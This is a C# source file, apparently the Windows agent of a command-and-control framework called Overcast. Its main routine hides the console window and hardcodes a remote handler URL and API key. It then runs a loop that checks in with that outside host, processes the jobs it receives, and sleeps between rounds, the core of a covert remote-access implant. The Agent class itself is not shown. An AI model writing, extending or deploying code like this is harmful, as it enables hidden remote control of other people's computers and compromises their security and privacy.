using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/*
 *  TODO:
 * 
 *  JSON checkin_data["checked_in"] is being deserialised as checking_data["0"]. Need to look at the
 *  returning json to correct this.
 * 
 * 
 */

namespace OvercastAgentWin
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;

            const int SW_HIDE = 0;
            //const int SW_SHOW = 5;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // To hide
            //ShowWindow(handle, SW_SHOW); // To show

            // USER REQUIRED (HANDLER URL / API_KEY)
            const string HANDLER_URL = "https://hackerman.guru/overcast/public/";
            const string API_KEY = "5f4dcc3b5aa765d61d8327deb882cf99";

            // Create new agent
            Debug.WriteLine("Creating a new agent");
            Agent agent = new Agent
            {
                api_key = API_KEY,
                handler_url = HANDLER_URL
            };

            // While agent has not been killed
            Debug.WriteLine("Starting main agent loop");
            while (!bool.Parse(agent.killed))
            {
                if (agent.UpdateSelf())
                {
                    if (agent.CheckIn())
                    {
                        agent.ProcessJobs();
                        try
                        {
                            agent.Sleep();
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                    }
                }
                
                
            }
            

            //Console.ReadLine();
        }
    }
}
